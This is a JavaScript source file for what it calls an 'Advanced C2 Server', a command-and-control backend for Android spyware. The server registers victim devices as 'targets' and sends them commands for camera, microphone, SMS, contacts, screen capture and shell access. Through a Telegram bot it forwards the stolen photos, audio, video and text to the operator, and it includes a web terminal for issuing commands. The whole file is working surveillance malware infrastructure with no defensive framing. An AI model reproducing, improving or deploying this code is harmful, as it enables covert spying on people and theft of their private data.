// index.js - Advanced C2 Server (Simple UI + Ultimate Telegram Bot Hub)
require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// --- Directories & Config ---
const FILES_DIR = path.join(__dirname, 'server_files');
const CONFIG_FILE = path.join(__dirname, 'config.json');

if (!fs.existsSync(FILES_DIR)) fs.mkdirSync(FILES_DIR, { recursive: true });

let appConfig = { tgToken: '', tgChatId: '' };
if (fs.existsSync(CONFIG_FILE)) {
    try { appConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')); } catch (e) {}
}

// --- Express & Socket Setup ---
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 5e8 // 500MB Data Limit for Videos/Screencasts
});

app.use(cors());
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ limit: '500mb', extended: true }));

const connectedDevices = new Map(); 
const pendingCommands = new Map(); 

// ==================== TELEGRAM BOT CORE ENGINE ====================

// 1. Send Text Message
async function sendTelegramText(htmlText) {
    if (!appConfig.tgToken || !appConfig.tgChatId) return;
    try {
        let text = htmlText.length > 3900 ? htmlText.substring(0, 3900) + "\n...[TRUNCATED]" : htmlText;
        await fetch(`https://api.telegram.org/bot${appConfig.tgToken}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: appConfig.tgChatId, text: text, parse_mode: 'HTML' })
        });
    } catch (err) {}
}

// 2. Send Media (Images, Audio, Video) directly to Telegram Chat
async function sendTelegramMedia(buffer, filename, cmdType) {
    if (!appConfig.tgToken || !appConfig.tgChatId) return;
    try {
        const formData = new FormData();
        formData.append('chat_id', appConfig.tgChatId);
        
        // Convert Buffer to Blob for native fetch FormData
        const blob = new Blob([buffer]);
        
        // Auto-detect Telegram API endpoint based on command intent
        let endpoint = 'sendDocument';
        if (cmdType.includes('camera') || cmdType.includes('screenshot')) endpoint = 'sendPhoto';
        else if (cmdType.includes('mic') || cmdType.includes('audio')) endpoint = 'sendAudio';
        else if (cmdType.includes('video') || cmdType.includes('screencast')) endpoint = 'sendVideo';

        // 'document', 'photo', 'audio', 'video' are the keys Telegram expects
        const formKey = endpoint.replace('send', '').toLowerCase(); 
        formData.append(formKey, blob, filename);

        await fetch(`https://api.telegram.org/bot${appConfig.tgToken}/${endpoint}`, {
            method: 'POST', body: formData
        });
    } catch (e) {
        sendTelegramText(`❌ Media upload failed: File too large or network issue.`);
    }
}

// 3. Receive Media Uploads (Video/Photo) FROM Telegram Bot
async function downloadTelegramFile(fileId, extension) {
    try {
        // Get File Path
        const res = await fetch(`https://api.telegram.org/bot${appConfig.tgToken}/getFile?file_id=${fileId}`);
        const data = await res.json();
        if (!data.ok) return;

        // Download File
        const fileRes = await fetch(`https://api.telegram.org/file/bot${appConfig.tgToken}/${data.result.file_path}`);
        const buffer = await fileRes.arrayBuffer();
        
        const filename = `TG_Upload_${Date.now()}.${extension}`;
        fs.writeFileSync(path.join(FILES_DIR, filename), Buffer.from(buffer));
        
        sendTelegramText(`📥 <b>File Received!</b>\nSaved to server as: <code>${filename}</code>`);
    } catch (e) { sendTelegramText(`❌ Failed to download file from Telegram.`); }
}

// 4. Poll Telegram Bot for incoming commands & files
let lastTgUpdateId = 0;
async function pollTelegram() {
    if (!appConfig.tgToken) return setTimeout(pollTelegram, 3000);
    try {
        const res = await fetch(`https://api.telegram.org/bot${appConfig.tgToken}/getUpdates?offset=${lastTgUpdateId + 1}&timeout=20`);
        const data = await res.json();
        
        if (data.ok && data.result.length > 0) {
            for (let update of data.result) {
                lastTgUpdateId = update.update_id;
                
                // Handle text commands
                if (update.message && update.message.text) {
                    handleTelegramCommand(update.message.text, update.message.chat.id);
                }
                
                // Handle Video Uploads
                if (update.message && update.message.video) {
                    sendTelegramText("⏳ Downloading video to server...");
                    downloadTelegramFile(update.message.video.file_id, 'mp4');
                }
                // Handle Photo Uploads
                if (update.message && update.message.photo) {
                    sendTelegramText("⏳ Downloading photo to server...");
                    let largestPhoto = update.message.photo[update.message.photo.length - 1]; // Get highest quality
                    downloadTelegramFile(largestPhoto.file_id, 'jpg');
                }
            }
        }
    } catch (e) {}
    setTimeout(pollTelegram, 1000);
}
setTimeout(pollTelegram, 2000);

// 5. Telegram Command Processor
function handleTelegramCommand(text, chatId) {
    if (String(chatId) !== String(appConfig.tgChatId)) return;

    if (text === '/start' || text === '/help') {
        return sendTelegramText(`🤖 <b>System Ready</b>\n\nCommands:\n/list - View devices\n/cmd &lt;command&gt; - Run on device\n<i>(e.g., /cmd camera, /cmd mic, /cmd sms)</i>\n\nYou can also upload Videos/Photos here.`);
    }

    if (text === '/list') {
        if (connectedDevices.size === 0) return sendTelegramText("❌ No active devices.");
        let list = Array.from(connectedDevices.values()).map(d => `📱 <b>${d.socket.deviceId}</b>`).join('\n');
        return sendTelegramText(`<b>Connected Devices:</b>\n${list}`);
    }

    if (text.startsWith('/cmd ')) {
        if (connectedDevices.size === 0) return sendTelegramText("❌ Devices Offline.");
        let commandToRun = text.replace('/cmd ', '').trim();
        let targetId = Array.from(connectedDevices.values())[0].socket.deviceId; // Auto pick first device

        sendTelegramText(`⏳ Requesting <code>${commandToRun}</code> from Android...`);
        const requestId = Date.now() + '-TG';
        const timer = setTimeout(() => { pendingCommands.delete(requestId); sendTelegramText(`❌ Timeout on target.`); }, 60000);

        pendingCommands.set(requestId, { timer, command: commandToRun, deviceId: targetId });
        connectedDevices.get(targetId).socket.emit('execute_command', { requestId, command: commandToRun });
    }
}

// ==================== WEB UI (Ultra Simple) ====================
const webUIHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Core Server</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --neon: #00ff00; --bg: #000; --panel: #111; --border: #050; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: var(--bg); color: var(--neon); font-family: monospace; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        
        nav { display: flex; background: var(--panel); border-bottom: 1px solid var(--border); }
        nav button { flex: 1; background: transparent; color: #555; border: none; padding: 15px; font-size: 14px; cursor: pointer; text-transform: uppercase; font-weight: bold; }
        nav button.active { color: #fff; background: var(--border); }

        .app-container { flex: 1; padding: 10px; display: flex; flex-direction: column; overflow: hidden; }
        .tab-content { display: none; flex-direction: column; height: 100%; }
        .tab-content.active { display: flex; }

        .status-box { text-align: center; margin: auto; padding: 20px; border: 2px solid var(--neon); border-radius: 10px; background: rgba(0,255,0,0.05); }
        .status-box h1 { font-size: 3rem; margin-bottom: 10px; text-shadow: 0 0 15px var(--neon); }

        #terminal-output { flex-grow: 1; background: #000; border: 1px solid var(--neon); padding: 10px; overflow-y: auto; font-size: 13px; white-space: pre-wrap; margin-bottom: 10px; }
        .input-area { display: flex; background: var(--panel); border: 1px solid var(--neon); }
        .prompt { padding: 12px; border-right: 1px solid var(--border); }
        #cmdInput { border: none; background: transparent; flex-grow: 1; padding: 12px; color: var(--neon); outline: none; }
        .btn { background: #020; color: var(--neon); border: none; padding: 10px 20px; cursor: pointer; font-weight:bold; }
        .btn:hover { background: var(--neon); color: #000; }

        .settings-card { border: 1px dashed var(--border); padding: 20px; text-align: center; max-width: 400px; margin: auto; }
        .settings-card input { width: 100%; padding: 10px; margin-bottom: 10px; background: #000; border: 1px solid var(--neon); color: var(--neon); }
    </style>
</head>
<body>

    <nav>
        <button id="nav-home" class="active" onclick="switchTab('home')"><i class="fas fa-satellite-dish"></i> Status</button>
        <button id="nav-terminal" onclick="switchTab('terminal')"><i class="fas fa-terminal"></i> Terminal</button>
        <button id="nav-setup" onclick="switchTab('setup')"><i class="fas fa-cog"></i> Setup</button>
    </nav>

    <div class="app-container">
        
        <div id="tab-home" class="tab-content active">
            <div class="status-box">
                <h1>🟢 ONLINE</h1>
                <p style="color: #fff; font-size: 1.2rem;">Server is Active and Listening</p>
                <div id="dev-count" style="margin-top:20px; font-size:1.5rem; color:#aaa;">Target Devices: 0</div>
            </div>
        </div>

        <div id="tab-terminal" class="tab-content">
            <div style="margin-bottom:10px;">
                <select id="deviceSelect" style="width:100%; padding:10px; background:#000; color:lime; border:1px solid lime;"><option value="">Select Device</option></select>
            </div>
            <div id="terminal-output">System initialized...<br></div>
            <div class="input-area">
                <span class="prompt">root:~#</span>
                <input type="text" id="cmdInput" placeholder="Enter command..." onkeypress="if(event.key === 'Enter') processInput()">
                <button class="btn" onclick="processInput()">SEND</button>
            </div>
        </div>

        <div id="tab-setup" class="tab-content">
            <div class="settings-card">
                <h2 style="margin-bottom: 20px;">Telegram Link</h2>
                <input type="text" id="cfgToken" placeholder="Bot Token">
                <input type="text" id="cfgChatId" placeholder="Your Chat ID">
                <button class="btn" style="width:100%;" onclick="saveConfig()">SAVE & CONNECT</button>
            </div>
        </div>

    </div>

    <script>
        const term = document.getElementById('terminal-output');
        function switchTab(tab) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('nav button').forEach(el => el.classList.remove('active'));
            document.getElementById('tab-'+tab).classList.add('active');
            document.getElementById('nav-'+tab).classList.add('active');
            if(tab === 'setup') fetchConfig();
        }

        function log(msg) {
            term.innerHTML += '<div>' + String(msg).replace(/\\n/g, '<br>') + '</div>';
            term.scrollTop = term.scrollHeight;
        }

        async function fetchConfig() {
            try {
                const data = await (await fetch('/api/settings')).json();
                document.getElementById('cfgToken').value = data.tgToken || '';
                document.getElementById('cfgChatId').value = data.tgChatId || '';
            } catch(e) {}
        }

        async function saveConfig() {
            await fetch('/api/settings', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ tgToken: document.getElementById('cfgToken').value, tgChatId: document.getElementById('cfgChatId').value })
            });
            alert('Connected to Telegram!');
        }

        async function loadDevices() {
            try {
                const data = await (await fetch('/api/devices')).json();
                document.getElementById('dev-count').innerText = "Target Devices: " + data.devices.length;
                const select = document.getElementById('deviceSelect');
                const prev = select.value;
                select.innerHTML = '<option value="">Select Device</option>';
                data.devices.forEach(d => { select.innerHTML += \`<option value="\${d.id}">\${d.id}</option>\`; });
                if(prev) select.value = prev;
            } catch (err) {}
        }
        setInterval(loadDevices, 3000); // Auto update count

        async function processInput() {
            const cmd = document.getElementById('cmdInput').value.trim();
            const devId = document.getElementById('deviceSelect').value;
            if (!cmd || !devId) return;
            document.getElementById('cmdInput').value = '';
            
            log('➔ ' + cmd);
            try {
                const res = await (await fetch('/api/command/' + devId, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd })
                })).json();
                
                if(res.result && res.result.length > 50000) log('[Binary/Large Data forwarded to Telegram]');
                else log(res.result || '[Empty Output]');
            } catch(e) { log('Error: ' + e.message); }
        }
    </script>
</body>
</html>
`;

app.get('/', (req, res) => res.send(webUIHTML));

// ==================== REST API ====================

app.get('/api/settings', (req, res) => res.json({ success: true, tgToken: appConfig.tgToken, tgChatId: appConfig.tgChatId }));
app.post('/api/settings', (req, res) => {
    appConfig.tgToken = req.body.tgToken || '';
    appConfig.tgChatId = req.body.tgChatId || '';
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(appConfig));
    res.json({ success: true });
});

app.get('/api/devices', (req, res) => {
    res.json({ success: true, devices: Array.from(connectedDevices.values()).map(d => ({ id: d.socket.deviceId })) });
});

app.post('/api/command/:deviceId', async (req, res) => {
    const { deviceId } = req.params;
    const { command } = req.body;
    if (!connectedDevices.has(deviceId)) return res.status(404).json({ error: 'Device offline' });

    const requestId = Date.now() + '-WEB';
    const p = new Promise((resolve, reject) => {
        const timer = setTimeout(() => { pendingCommands.delete(requestId); reject(new Error('Timeout')); }, 60000); 
        pendingCommands.set(requestId, { resolve, reject, timer, command, deviceId }); 
    });

    try {
        connectedDevices.get(deviceId).socket.emit('execute_command', { requestId, command });
        let result = await p; 
        res.json({ success: true, result });
    } catch (error) { res.status(500).json({ error: error.message }); }
});

// ==================== SOCKET & DATA ROUTER ====================
io.on('connection', (socket) => {
    socket.on('register_device', (data) => {
        socket.deviceId = data.deviceId;
        connectedDevices.set(data.deviceId, { socket, deviceInfo: data.deviceInfo || {} });
        sendTelegramText(`📱 <b>Target Linked!</b>\nID: <code>${data.deviceId}</code>`);
    });

    socket.on('command_response', async (data) => {
        const { requestId, success, result, error } = data;
        const pending = pendingCommands.get(requestId);
        if (pending) {
            clearTimeout(pending.timer);
            pendingCommands.delete(requestId);

            // 1. Resolve to Web Terminal
            if (pending.resolve) {
                if (success) pending.resolve(result); else pending.reject(new Error(error));
            }

            // 2. ROUTE ALL DATA TO TELEGRAM
            if (success) {
                // Check if result is a Base64 media string (heuristic check)
                const isBase64 = typeof result === 'string' && /^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/.test(result.replace(/^data:.*?;base64,/, "")) && result.length > 500;

                if (isBase64) {
                    sendTelegramText(`⏳ Media generated by <b>${pending.command}</b>. Uploading...`);
                    
                    let base64Data = result.replace(/^data:.*?;base64,/, "");
                    let buffer = Buffer.from(base64Data, 'base64');
                    
                    let filename = `Output_${Date.now()}`;
                    if (pending.command.includes('mic')) filename += '.mp3';
                    else if (pending.command.includes('video') || pending.command.includes('screen')) filename += '.mp4';
                    else filename += '.jpg'; // default to image for camera/screenshot

                    await sendTelegramMedia(buffer, filename, pending.command);
                } else {
                    // Normal Text / JSON Data (SMS, Contacts, Shell)
                    let textData = typeof result === 'object' ? JSON.stringify(result, null, 2) : String(result);
                    sendTelegramText(`✅ <b>Result for:</b> <code>${pending.command}</code>\n\n<pre>${textData}</pre>`);
                }
            } else {
                sendTelegramText(`❌ <b>Failed:</b> <code>${pending.command}</code>\nError: ${error}`);
            }
        }
    });

    socket.on('disconnect', () => {
        if (socket.deviceId) {
            connectedDevices.delete(socket.deviceId);
            sendTelegramText(`⚠️ <b>Target Offline</b>\nID: <code>${socket.deviceId}</code>`);
        }
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => console.log("🚀 Server Live on Port " + PORT));
